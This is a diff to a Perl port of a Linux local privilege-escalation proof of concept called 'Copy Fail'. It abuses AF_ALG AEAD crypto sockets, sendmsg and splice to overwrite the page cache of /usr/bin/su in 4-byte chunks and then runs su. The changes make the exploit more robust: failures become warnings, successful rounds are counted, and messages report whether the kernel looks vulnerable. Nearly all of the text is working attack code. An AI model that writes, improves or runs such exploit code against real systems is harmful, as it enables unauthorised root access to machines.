@@ -53,20 +53,32 @@ sub send_data_over_crypto_socket {
 
     # Create and bind AF_ALG crypto socket (exact same parameters as Python)
     socket(my $crypto, $AF_ALG, $SOCK_SEQPACKET, 0)
-        or die "socket(AF_ALG): $!";
+        or do { warn "socket(AF_ALG) failed: $!"; return 0; };
 
     my $addr = sockaddr_alg("aead", "authencesn(hmac(sha256),cbc(aes))");
     bind($crypto, $addr)
-        or die "bind: $!";
+        or do { warn "bind failed: $!"; close($crypto); return 0; };
 
     # Initial configuration (note: ALG_SET_KEY uses value 3 per the original PoC)
-    setsockopt($crypto, $SOL_ALG, $ALG_SET_KEY, $KEY_DATA);
-    setsockopt($crypto, $SOL_ALG, $ALG_SET_AEAD_AUTHSIZE, $AUTH_SIZE_4);
-    setsockopt($crypto, $SOL_ALG, $ALG_SET_AEAD_ASSOCLEN, $ASSOC_LEN_DATA);
+    setsockopt($crypto, $SOL_ALG, $ALG_SET_KEY, $KEY_DATA)
+        or warn "setsockopt(KEY) warning: $!";
+    setsockopt($crypto, $SOL_ALG, $ALG_SET_AEAD_AUTHSIZE, $AUTH_SIZE_4)
+        or warn "setsockopt(AUTHSIZE) warning: $!";
+    setsockopt($crypto, $SOL_ALG, $ALG_SET_AEAD_ASSOCLEN, $ASSOC_LEN_DATA)
+        or warn "setsockopt(ASSOCLEN) warning: $!";
 
-    # Accept operation socket
-    accept(my $client, $crypto)
-        or die "accept: $!";
+    # Accept operation socket.
+    # NOTE: On patched kernels (or when the AEAD setup is rejected), this commonly fails
+    # with "Software caused connection abort" (ECONNABORTED). We no longer die here so the
+    # script can continue and you can see whether any rounds succeed.
+    my $client;
+    unless (accept($client, $crypto)) {
+        my $err = $!;
+        my $errno = 0 + $!;
+        warn sprintf("accept failed at offset %d: %s (errno %d)", $offset, $err, $errno);
+        close($crypto);
+        return 0;
+    }
 
     my $client_fd = fileno($client);
 
@@ -120,9 +132,20 @@ sub send_data_over_crypto_socket {
     close($crypto);
     close($pr);
     close($pw);
+
+    return 1;   # Success: we got the operation socket and executed sendmsg + splices
 }
 
+# Make sure early returns from the sub are falsy
+# (the "return;" statements above already return undef, which is false)
+
 sub main {
+    print "Copy Fail PoC (Perl port) starting. Target: /usr/bin/su\n";
+    print "Kernel: ", `uname -r 2>/dev/null` || "unknown", "\n";
+    print "Note: 'accept: Software caused connection abort' (ECONNABORTED) on many/all rounds\n";
+    print "      usually means the kernel rejected the AEAD setup (i.e. likely patched or not vulnerable).\n";
+    print "      On a vulnerable kernel, accept should succeed for most rounds.\n\n";
+
     # Open target read-only (we only ever pass the fd to splice)
     open(my $sufh, '<', '/usr/bin/su') or die "open(/usr/bin/su): $!";
     my $su_fd = fileno($sufh);
@@ -134,13 +157,22 @@ sub main {
 
     my $off = 0;
     my $len = length($payload);
+    my $success_rounds = 0;
     while ($off < $len) {
         my $chunk = substr($payload, $off, 4);
-        send_data_over_crypto_socket($su_fd, $off, $chunk);
+        if (send_data_over_crypto_socket($su_fd, $off, $chunk)) {
+            $success_rounds++;
+        }
         $off += 4;
     }
 
+    print "\nAll 40 rounds attempted. Rounds that got past accept (primitive attempted): $success_rounds / 40\n";
+    print "Check the warnings above for details on failures.\n";
+    print "Few or no 'accept failed' messages + the script reaching 'system su' usually indicates a vulnerable kernel.\n";
+    print "Many 'accept failed' messages (especially ECONNABORTED) = kernel is rejecting the primitive (patched or not vulnerable).\n\n";
+
     # Execute the (now page-cache-modified) su
+    print "Attempting su...\n";
     system('su');
 }
 
